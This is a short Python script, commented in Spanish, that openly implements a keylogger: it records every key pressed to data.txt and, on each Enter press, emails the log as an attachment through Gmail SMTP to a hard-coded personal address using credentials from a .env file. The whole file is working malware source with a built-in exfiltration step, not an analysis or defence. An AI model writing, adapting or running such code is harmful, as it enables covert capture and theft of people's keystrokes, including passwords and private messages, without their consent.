#importar librerias necesarias para desarrollar el keylogger 

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from decouple import config
import keyboard

# Obtener credenciales del archivo .env 
email_user = config('EMAIL_USER')
email_password = config('EMAIL_PASSWORD')

# Función para enviar correo electrónico con archivo adjunto

def send_email():
    print("Enviando correo electrónico...")

    # Crear mensaje multipart
    msg = MIMEMultipart()
    msg['From'] = email_user
    msg['To'] = 'luispay0102@gmail.com'
    msg['Subject'] = 'Keylogger Data'

    # Cuerpo del mensaje
    body = 'Se adjunta el archivo data.txt con los registros del keylogger.'
    msg.attach(MIMEText(body, 'plain'))

    # Adjuntar archivo
    filename = 'data.txt'
    attachment = open(filename, 'rb')
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', f'attachment; filename= {filename}')
    msg.attach(part)

    # Conexión SMTP y envío de correo
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email_user, email_password)
        text = msg.as_string()
        server.sendmail(email_user, 'luispay0102@gmail.com', text)
        server.quit()
        print('El correo se ha enviado exitosamente con el archivo adjunto')
    except Exception as e:
        print('Error al enviar el correo:', e)

# Keylogger
def pressedKey(key):
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)
        print(f"Tecla '{key.name}' presionada y registrada en data.txt")

    if key.name == 'enter':
        # Envía el correo electrónico cuando se presiona la tecla "enter"
        send_email()

# Inicia el keylogger
print("Keylogger iniciado. Presiona 'esc' para salir.")
keyboard.on_press(pressedKey)
keyboard.wait('esc')  
# Espera hasta que se presione la tecla "esc" para salir

